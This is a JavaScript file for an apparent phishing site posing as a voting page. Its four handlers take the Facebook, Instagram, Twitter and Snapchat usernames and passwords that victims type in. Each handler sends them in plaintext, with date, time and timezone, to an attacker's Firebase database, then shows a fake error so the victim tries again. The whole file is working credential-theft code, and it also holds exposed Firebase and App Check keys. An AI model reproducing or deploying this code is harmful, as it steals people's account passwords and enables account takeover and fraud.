// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDbm1iws7TzQUqr_vHUdEo-sp0dpGsgdOE",
  authDomain: "ravedasianas.firebaseapp.com",
  databaseURL: "https://ravedasianas-default-rtdb.firebaseio.com",
  projectId: "ravedasianas",
  storageBucket: "ravedasianas.appspot.com",
  messagingSenderId: "224131972107",
  appId: "1:224131972107:web:b9d2ace2ebfe3b07c99b0e"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);


function tw_login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('tw-email').value;
  var password = document.getElementById('tw-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Twitter';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}


function snp_login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('snp-email').value;
  var password = document.getElementById('snp-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Snapchat';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('snp-pass').value = '';

      return false;
    }, 2000);
  }
}

function iglog() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var username = document.getElementById('ig-uname').value;
  var password = document.getElementById('ig-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = 'Instagram';

  if (username !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: username,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });

      document.getElementById('ig-pass').value = '';
      return false;
    }, 2000);
  }
}

function login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('fb-email').value;
  var password = document.getElementById('fb-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Facebook';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}